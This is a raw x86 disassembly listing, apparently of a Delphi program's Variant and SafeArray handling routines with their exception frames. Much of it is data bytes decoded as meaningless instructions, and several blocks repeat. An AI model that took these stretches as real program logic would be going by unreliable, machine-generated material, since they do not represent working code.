add [ eax ] al
in al 0xe8
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
outsb
je r-xdata
popad
popad
outsb
je r-xdata
sar [ eax + ebp * 8 + 0x40 ] 0x0
add [ eax ] al
fdiv [ edx ]
outsd
inc eax
add al bh
inc eax
add [ eax + 0x40e9 ] dh
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
inc eax
add [ 0x72615645 ] dl
pushfd
xor eax 0x35a00040
popad
push esi
popad
jb r-xdata
add [ eax ] al
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
outsb
je r-xdata
popad
outsb
je r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add ah bl
xor al [ eax ]
clc
insd
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
jb r-xdata
add [ eax ] al
jb r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add ah bl
xor al [ eax ]
clc
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ ebx + esi ] dh
outsb
js r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
jl r-xdata
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] bl
0x40 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
0xc0040 0x0
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
inc eax
add ah ah
call sub_40e8de
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eae5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40eb77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4107d8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4107d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040b8
retn
dec ebp
in al 0x8b
mov ebx eax
popad
jb r-xdata
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] dh
add [ eax ] al
add [ edx + edi * 2 ] al
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
call r--data
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
call sub_40e812
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al ch
inc eax
add [ eax + eax ] cl
push 0x0
xor eax eax
push ebp
push sub_40eade
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
dec ecx
add al ch
0x40 0x0
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_40e8de
inc eax
add [ ebx + esi ] dh
outsb
je r-xdata
popad
fdiv [ edx ]
outsd
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add ah bl
xor al [ eax ]
clc
insd
inc eax
add al bh
inc eax
add [ eax + 0x40e9 ] dh
add [ eax ] al
popad
add [ ebx + esi ] dh
outsb
js r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jne r-xdata
jb r-xdata
inc ebp
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
jl r-xdata
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] bl
0x40 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
0xc0040 0x0
outsd
jb r-xdata
jo r-xdata
popad
je r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eae5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40eb77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4107d8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4107d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040b8
retn
dec ebp
in al 0x8b
mov ebx eax
popad
jb r-xdata
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40eade
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
dec ecx
add al ch
0x40 0x0
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] dh
add [ eax ] al
add [ edx + edi * 2 ] al
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
dec ecx
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add ah ah
call sub_40e8de
add ah bl
xor al [ eax ]
clc
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xe8
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
popad
outsb
je r-xdata
sar [ eax + ebp * 8 + 0x40 ] 0x0
add [ eax ] al
jb r-xdata
popad
jns r-xdata
outsb
js r-xdata
pushfd
xor eax 0x35a00040
popad
push esi
popad
jb r-xdata
add [ eax ] al
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax ] al
jb r-xdata
xor al [ eax ]
xor al 0x33
add ah bl
xor al [ eax ]
clc
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
call r--data
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
call sub_40e812
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al ch
inc eax
add [ eax + eax ] cl
sub_40ea94
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eade
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eae5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40eae8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4107d8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4107d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040b8
retn
sub_40eb84
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ebce
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebd5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40ebd8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ec67
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4107d8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4107d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec6e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040b8
retn
sub_40ec74
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ecbe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecc5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40ecc8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ef0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef14
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_4040b8
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
dec eax
je r-xdata
call sub_40ea94
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
jmp r-xdata
call sub_40eb84
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b4b4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
jmp r-xdata
sub_40ef28
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40eae8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ebd8
jmp r-xdata
jmp r-xdata
call sub_40ecc8
sub_40ef5c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40efa6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40efad
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40efc4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eff4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eff4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f050
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ef1c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ef1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40efc4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ef1c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ef1c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eff4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef1c
mov eax [ ebp - 0x314 ]
call sub_40f248
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f1cc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ef1c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404094
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410c34
test al al
je r-xdata
mov eax ebx
call sub_40f050
jmp r-xdata
push ebx
call VariantClear
call sub_40ef1c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f264
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f294
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f294
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f2f0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ef1c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ef1c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
